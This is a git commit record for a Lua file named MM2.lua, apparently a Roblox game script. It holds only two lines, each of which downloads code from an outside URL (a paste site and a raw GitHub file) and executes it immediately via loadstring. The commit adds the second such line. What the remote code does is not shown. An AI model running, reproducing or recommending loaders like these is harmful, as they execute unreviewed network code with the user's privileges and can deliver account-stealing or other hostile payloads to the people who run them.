cb1aebc54060d15e028ba7dd8a5b42f6211d7996
Anonimo221123 <misaelgarciaparedes2782009@gmail.com>
2025-08-21 18:51:59 -0500

    Update MM2.lua

--- MM2.lua
+++ MM2.lua
@@ -1,1 +1,2 @@
 loadstring(game:HttpGet("https://paste.debian.net/plainh/3bbb0885/", true))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Anonimo221123/TestJonGhost/refs/heads/main/MM2.lua'))()
